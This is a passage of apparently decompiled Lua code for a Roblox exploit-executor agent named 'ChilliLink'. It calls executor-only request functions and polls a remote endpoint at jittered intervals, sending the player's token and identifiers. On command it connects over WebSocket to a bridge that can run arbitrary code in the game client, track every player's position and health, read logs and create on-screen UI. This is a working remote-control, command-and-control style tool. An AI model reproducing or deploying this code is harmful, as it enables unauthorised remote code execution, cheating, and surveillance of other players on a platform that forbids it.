				tbl26.lineCount = tbl26.lineCount + 1
				if #tbl26.pending >= n7 then
					tbl26.dropped = tbl26.dropped + 1
					return
				end
				table.insert(tbl26.pending, { kind = arg2, text = arg3:sub(1, 1000) })
			end)

			setfenv(v11, v12)
			tbl25[tbl26.id] = tbl26

			task.spawn(function()
				while tbl25[tbl26.id] == tbl26 do
					task.wait(0.3)

					if tbl26.dropped > 0 then
						table.insert(tbl26.pending, { kind = "warn", text = string.format("... %d line(s) skipped ...", tbl26.dropped) })
						tbl26.dropped = 0
					end

					fn46(tbl26)
				end
			end)

			tbl26.thread = task.defer(function()
				local v13 = table.pack(xpcall(v11, fn45))
				if tbl25[tbl26.id] ~= tbl26 then
					return
				end
				tbl25[tbl26.id] = nil
				fn46(tbl26)
				local startedAt = tbl26.startedAt
				local n8 = math.floor((os.clock() - startedAt) * 1000 + 0.5)
				local tbl27 = { runId = tbl26.id, label = tbl26.label, ok = v13[1] == true, elapsedMs = n8 }

				if v13[1] then
					local v14 = fn44(v13, n8, {}, false)
					tbl27.returnsInfo = v14.returnsInfo
					tbl27.returnCount = v14.returnCount
				else
					tbl27.error = tostring(v13[2]):sub(1, 4000)
				end

				fn23("exec.finished", tbl27)
			end)

			return { runId = tbl26.id, label = tbl26.label }
		end,
		["exec.cancel"] = function(arg)
			local v11 = tbl25[tostring(arg.runId or "")]
			if not v11 then
				return { cancelled = false, reason = "not running" }
			end
			tbl25[v11.id] = nil
			pcall(task.cancel, v11.thread)
			fn46(v11)
			local startedAt = v11.startedAt

			fn23("exec.finished", {
				runId = v11.id,
				label = v11.label,
				ok = false,
				cancelled = true,
				error = "Cancelled from the web console",
				elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5),
			})

			return { cancelled = true, runId = v11.id }
		end,
		["exec.list"] = function()
			local tbl26 = {}

			for k, v11 in pairs(tbl25) do
				local startedAt = v11.startedAt

				table.insert(tbl26, {
					runId = k,
					label = v11.label,
					lines = v11.lineCount,
					elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5),
				})
			end

			return { count = #tbl26, runs = tbl26 }
		end,
		["console.tail"] = function(arg)
			local logHistory = game:GetService("LogService"):GetLogHistory()
			local v11 = fn15(arg.limit, 1, 500, 200)
			local n8 = tonumber(arg.since) or 0
			local tbl26 = {}

			for i = #logHistory, 1, -1 do
				local v12 = logHistory[i]

				if not (v12.timestamp <= n8 or #tbl26 >= v11) then
					table.insert(tbl26, 1, {
						message = tostring(v12.message):sub(1, 1000),
						kind = v12.messageType.Name,
						time = v12.timestamp,
					})

					continue
				end

				break
			end

			return { count = #tbl26, entries = tbl26, latest = logHistory[#logHistory] and logHistory[#logHistory].timestamp or n8 }
		end,
		["players.list"] = function(arg)
			local tbl26 = {}
			local flag7 = arg.includePosition ~= false

			for _, player in ipairs(Players2:GetPlayers()) do
				table.insert(tbl26, fn47(player, flag7))
			end

			table.sort(tbl26, function(arg2, arg3)
				return string.lower(arg2.name) < string.lower(arg3.name)
			end)

			return { count = #tbl26, players = tbl26 }
		end,
		["players.get"] = function(arg)
			local query = arg.query
			local num = tonumber(query)
			local v11 = string.lower(fn14(query))

			for _, player in ipairs(Players2:GetPlayers()) do
				if num and player.UserId == num or string.lower(player.Name) == v11 or string.lower(player.DisplayName) == v11 then
					return fn47(player, true)
				end
			end

			error("player not found: " .. tostring(query))
		end,
		["characters.list"] = function()
			local tbl26 = {}

			for _, player in ipairs(Players2:GetPlayers()) do
				local character = player.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

				table.insert(tbl26, {
					player = player.Name,
					userId = player.UserId,
					characterPath = character and fn20(character) or nil,
					health = humanoid and humanoid.Health or nil,
					maxHealth = humanoid and humanoid.MaxHealth or nil,
					walkSpeed = humanoid and humanoid.WalkSpeed or nil,
					jumpPower = humanoid and humanoid.JumpPower or nil,
					moveDirection = humanoid and fn21(humanoid.MoveDirection) or nil,
					state = humanoid and tostring(humanoid:GetState()) or nil,
					position = humanoidRootPart and fn21(humanoidRootPart.Position) or nil,
					velocity = humanoidRootPart and fn21(humanoidRootPart.AssemblyLinearVelocity) or nil,
				})
			end

			return { count = #tbl26, characters = tbl26 }
		end,
		["workspace.summary"] = function(arg)
			local n8 = math.floor(fn15(arg.maxDescendants, 1, 5000, 2000))
			local tbl26 = {}
			local tbl27 = {}

			for _, child in ipairs(Workspace:GetChildren()) do
				table.insert(tbl27, fn26(child))
			end

			local v11 = fn27(Workspace, n8, function(arg2)
				tbl26[arg2.ClassName] = (tbl26[arg2.ClassName] or 0) + 1
				return false
			end)

			return {
				topLevel = tbl27,
				topLevelCount = #tbl27,
				scannedDescendants = v11,
				truncated = v11 >= n8,
				classCounts = tbl26,
			}
		end,
		["instance.find"] = function(arg)
			local v11, v12 = fn24(arg.root or "Workspace")

			if not v11 then
				error(v12)
			end

			local v13 = string.lower(fn14(arg.nameContains))
			local v14 = fn14(arg.className)
			local n8 = math.floor(fn15(arg.limit, 1, 200, 50))
			local tbl26 = {}

			local v15 = fn27(v11, math.floor(fn15(arg.scanLimit, 1, 10000, 3000)), function(arg2)
				local flag7 = v13 == "" or string.find(string.lower(arg2.Name), v13, 1, true) ~= nil
				local flag8 = false

				if v14 ~= "" and arg2.ClassName ~= v14 then
					pcall(function()
						flag8 = arg2:IsA(v14)
					end)
				end

				if flag7 and (v14 == "" or arg2.ClassName == v14 or flag8) then
					table.insert(tbl26, fn26(arg2))
				end

				return #tbl26 >= n8
			end)

			return { root = fn20(v11), scanned = v15, count = #tbl26, matches = tbl26 }
		end,
		["instance.children"] = function(arg)
			local v11, v12 = fn24(arg.path)

			if not v11 then
				error(v12)
			end

			local n8 = math.floor(fn15(arg.limit, 1, 500, 100))
			local children = v11:GetChildren()
			local tbl26 = {}

			for i = 1, math.min(#children, n8) do
				table.insert(tbl26, fn26(children[i]))
			end

			return { parent = fn26(v11), total = #children, returned = #tbl26, children = tbl26 }
		end,
		["instance.inspect"] = function(arg)
			local v11, v12 = fn24(arg.path)

			if not v11 then
				error(v12)
			end

			local tbl26 = {}

			for _, v13 in ipairs(tbl16) do
				tbl26[v13] = true
			end

			if type(arg.properties) == "table" then
				for _, property in ipairs(arg.properties) do
					tbl26[tostring(property)] = true
				end
			end

			local tbl27 = {}
			local tbl28 = {}

			for k in pairs(tbl26) do
				local v13, v14 = fn25(v11, k)

				if v14 then
					tbl28[k] = v14
				else
					tbl27[k] = v13
				end
			end

			return {
				instance = fn26(v11),
				attributes = fn21(v11:GetAttributes()),
				tags = fn21(v11:GetTags()),
				childCount = #v11:GetChildren(),
				properties = tbl27,
				unavailable = tbl28,
			}
		end,
		["instance.attributes"] = function(arg)
			local v11, v12 = fn24(arg.path)

			if not v11 then
				error(v12)
			end

			return { instance = fn26(v11), attributes = fn21(v11:GetAttributes()) }
		end,
		["camera.get"] = function()
			local currentCamera = Workspace.CurrentCamera

			if not currentCamera then
				error("CurrentCamera is unavailable")
			end

			return {
				path = fn20(currentCamera),
				cameraType = tostring(currentCamera.CameraType),
				fieldOfView = currentCamera.FieldOfView,
				viewportSize = fn21(currentCamera.ViewportSize),
				cframe = fn21(currentCamera.CFrame),
				focus = fn21(currentCamera.Focus),
				subject = fn21(currentCamera.CameraSubject),
			}
		end,
		["telemetry.snapshot"] = function()
			local result = RunService2.RenderStepped:Wait()
			local totalMemoryUsageMb = nil

			pcall(function()
				totalMemoryUsageMb = game:GetService("Stats"):GetTotalMemoryUsageMb()
			end)

			return {
				fpsEstimate = result > 0 and math.floor(1 / result + 0.5) or nil,
				frameDeltaMs = result * 1000,
				memoryMb = totalMemoryUsageMb,
				playerCount = #Players2:GetPlayers(),
				placeId = game.PlaceId,
				jobId = game.JobId,
				distributedGameTime = Workspace.DistributedGameTime,
				timestamp = DateTime.now().UnixTimestampMillis,
			}
		end,
		["ui.create"] = function(arg)
			local v11, v12 = fn35(true)

			if not v11 then
				error(v12)
			end

			if arg.replace ~= false then
				fn16(tbl14)

				for _, child in ipairs(v11:GetChildren()) do
					child:Destroy()
				end
			end

			local tbl26 = { count = 0 }
			local v13, v14 = fn38(arg.tree, v11, 1, tbl26)
			return { created = fn26(v13), objectCount = tbl26.count, propertyResult = v14 }
		end,
		["ui.update"] = function(arg)
			local v11, v12 = fn36(arg.path)

			if not v11 then
				error(v12)
			end

			return { instance = fn26(v11), result = fn33(v11, arg.props) }
		end,
		["ui.delete"] = function(arg)
			local v11 = fn14(arg.path)
			local v12, v13 = fn36(v11)

			if not v12 then
				if v11 == "" then
					return { deleted = false, reason = "managed UI does not exist" }
				end
				error(v13)
			end

			fn16(tbl14)
			local v14 = fn20(v12)
			v12:Destroy()
			return { deleted = true, path = v14 }
		end,
		["ui.list"] = function(arg)
			local v11, v12 = fn35(false)
			if not v11 then
				return { exists = false, reason = v12 or "managed UI does not exist" }
			end
			local n8 = math.floor(fn15(arg.maxDepth, 1, 10, 6))
			return { exists = true, tree = fn39(v11, 0, n8) }
		end,
		["ui.notify"] = function(arg)
			local v11, v12 = fn35(true)

			if not v11 then
				error(v12)
			end

			local notifications = v11:FindFirstChild("Notifications")

			if not notifications then
				notifications = Instance.new("Frame")
				notifications.Name = "Notifications"
				notifications.AnchorPoint = Vector2.new(1, 0)
				notifications.Position = UDim2.new(1, -16, 0, 16)
				notifications.Size = UDim2.fromOffset(360, 500)
				notifications.BackgroundTransparency = 1
				notifications.Parent = v11
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.Padding = UDim.new(0, 8)
				uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.Parent = notifications
			end

			local textLabel = Instance.new("TextLabel")
			textLabel.Name = "Notification_" .. HttpService:GenerateGUID(false)
			textLabel.Size = UDim2.fromOffset(340, 64)
			textLabel.BackgroundColor3 = fn28(arg.color) or Color3.fromRGB(25, 35, 52)
			textLabel.BackgroundTransparency = 0.08
			textLabel.Text = tostring(arg.text):sub(1, 500)
			textLabel.TextColor3 = Color3.fromRGB(240, 247, 255)
			textLabel.TextSize = 16
			textLabel.Font = Enum.Font.GothamSemibold
			textLabel.TextWrapped = true
			textLabel.Parent = notifications
			local uiCorner = Instance.new("UICorner")
			uiCorner.CornerRadius = UDim.new(0, 10)
			uiCorner.Parent = textLabel
			local v13 = fn15(arg.duration, 0.5, 30, 4)

			task.delay(v13, function()
				if textLabel.Parent then
					textLabel:Destroy()
				end
			end)

			return { shown = true, name = textLabel.Name, duration = v13 }
		end,
	}

	local function fn48(arg)
		local str5 = tostring(arg.requestId or "")
		local unknownOrDisallowedMethod = tostring(arg.method or "")
		local v11 = tbl26[unknownOrDisallowedMethod]
		if str5 == "" then
			return
		end

		if not v11 then
			fn22({
				type = "rpc_result",
				requestId = str5,
				success = false,
				error = "Unknown or disallowed method: " .. unknownOrDisallowedMethod,
			})

			return
		end

		task.spawn(function()
			local ok, result = xpcall(function()
				return v11(type(arg.params) == "table" and arg.params or {})
			end, function(arg2)
				return debug.traceback(tostring(arg2), 2)
			end)

			if ok then
				fn22({ type = "rpc_result", requestId = str5, success = true, data = fn21(result) })
			else
				fn22({ type = "rpc_result", requestId = str5, success = false, error = tostring(result):sub(1, 2000) })
			end
		end)
	end

	local function fn49(arg)
		local ok, result = pcall(function()
			return HttpService:JSONDecode(tostring(arg))
		end)

		if not ok or type(result) ~= "table" then
			fn13("Invalid JSON message")
			return
		end

		if result.type == "identify_ok" then
			fn12("Connected to bridge. Client ID:", tostring(result.clientId))
			local tbl27 = {}

			for k in pairs(tbl26) do
				table.insert(tbl27, k)
			end

			table.sort(tbl27)
			fn23("agent.ready", { clientId = result.clientId, methods = tbl27, playerCount = #Players2:GetPlayers() })
			return
		end

		if result.type == "pong" then
			fn12("PONG", tostring(result.seq or ""))
			return
		end

		if result.type == "rpc_request" then
			fn48(result)
			return
		end

		if result.type == "identify_error" then
			fn13("Bridge rejected identity:", tostring(result.error))
		end
	end

	local function fn50()
		flag5 = false
		fn16(tbl13)
		if not v10 then
			return
		end

		pcall(function()
			if type(v10.Close) == "function" then
				v10:Close()
			elseif type(v10.close) == "function" then
				v10:close()
			end
		end)

		v10 = nil
	end

	local function fn51()
		local v11, v12 = fn17()
		if not v11 then
			fn13("No supported WebSocket API found")
			return false
		end
		n4 += 1
		local v13 = n4
		fn12("Connecting to", str2, "using", v12)

		local ok, result = pcall(function()
			return v11(str2)
		end)

		if not ok or not result then
			fn13("Connection failed:", tostring(result))
			return false
		end
		v10 = result
		flag5 = true
		local onMessage = fn18(v10, "OnMessage", "MessageReceived")
		local onClose = fn18(v10, "OnClose", "Closed", "OnDisconnect")
		local onError = fn18(v10, "OnError", "Error")

		local v14 = fn19(onMessage, function(arg)
			if v13 == n4 then
				fn49(arg)
			end
		end)

		if v14 then
			table.insert(tbl13, v14)

			local v15 = fn19(onClose, function(...)
				if v13 == n4 then
					flag5 = false
					fn13("Socket closed", ...)
				end
			end)

			if v15 then
				table.insert(tbl13, v15)
			end

			local v16 = fn19(onError, function(...)
				if v13 == n4 then
					fn13("Socket error", ...)
					flag5 = false
				end
			end)

			if v16 then
				table.insert(tbl13, v16)
			end

			local v17, v18 = fn22({
				type = "identify",
				clientType = "roblox",
				token = str,
				name = localPlayer2.Name,
				displayName = localPlayer2.DisplayName,
				userId = localPlayer2.UserId,
				placeId = game.PlaceId,
				jobId = game.JobId,
				version = str4,
			})

			if not v17 then
				fn13(v18)
				flag5 = false
			end

			task.spawn(function()
				while flag4 and flag5 and v13 == n4 do
					task.wait(20)

					if flag4 and flag5 and v13 == n4 then
						n5 += 1
						local v19, v20 = fn22({ type = "ping", seq = n5 })

						if not v19 then
							fn13("Heartbeat failed:", tostring(v20))
							flag5 = false
						end
					end
				end
			end)

			while flag4 and flag5 and v13 == n4 do
				task.wait(0.5)
			end

			if v13 == n4 then
				fn50()
			end

			return true
		end

		fn13("Socket has no supported message event")
		fn50()
		return false
	end

	table.insert(tbl12, Players2.PlayerAdded:Connect(function(player)
		if flag3 then
			fn23("player.added", fn47(player, true))
		end
	end))

	table.insert(tbl12, Players2.PlayerRemoving:Connect(function(player)
		if flag3 then
			fn23("player.removing", fn47(player, true))
		end
	end))

	genv.StopChilliLink = function()
		if not flag4 then
			return
		end
		fn12("Stopping agent")
		flag4 = false
		n4 += 1
		fn16(tbl12)
		fn16(tbl14)
		fn50()
	end

	local request_2 = syn and syn.request or http_request or request or request_ and request_.request
	local request_3

	if request_2 then
		request_3 = request_2
	else
		request_3 = fluxus and fluxus.request
	end

	local function fn52()
		if type(request_3) ~= "function" then
			return nil
		end

		local ok, result = pcall(function()
			return HttpService:JSONEncode({
				token = str,
				userId = localPlayer2.UserId,
				name = localPlayer2.Name,
				displayName = localPlayer2.DisplayName,
				placeId = game.PlaceId,
				jobId = game.JobId,
				version = str4,
			})
		end)

		if not ok then
			return nil
		end
		local ok2, result2 = pcall(request_3, { Url = str3, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = result })
		if not ok2 or type(result2) ~= "table" or tonumber(result2.StatusCode) ~= 200 then
			return nil
		end

		local ok3, result3 = pcall(function()
			return HttpService:JSONDecode(tostring(result2.Body))
		end)

		if ok3 and type(result3) == "table" then
			return result3
		end
		return nil
	end

	task.spawn(function()
		while flag4 do
			local v11 = fn52()
			local n8 = 60

			if v11 then
				n8 = fn15(v11.interval, 5, 600, 60)

				if v11.connect == true and not flag6 and not flag5 then
					flag6 = true

					task.spawn(function()
						pcall(fn51)
						flag6 = false
					end)
				end
			end

			task.wait(n8 * (0.85 + math.random() * 0.3))
		end

		fn12("Agent stopped")
	end)
end
